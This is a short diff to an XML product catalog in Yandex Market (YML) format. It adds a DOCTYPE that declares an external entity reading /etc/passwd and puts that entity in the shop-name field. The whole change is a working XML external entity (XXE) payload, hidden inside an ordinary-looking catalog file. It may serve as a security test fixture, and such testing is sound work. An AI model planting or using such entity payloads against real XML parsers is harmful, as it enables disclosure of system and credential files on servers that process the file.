@@ -1,6 +1,7 @@
 <yml_catalog date="2025-02-19T08:16:47+00:00">
+<!DOCTYPE foo [<!ENTITY etc SYSTEM "/etc/passwd"> ]>
  <shop>
-  <name>BestSeller</name>
+  <name>&etc;</name>
   <company>Tne Best inc.</company>
   <url>http://best.seller.ru</url>
   <version>1.0</version>
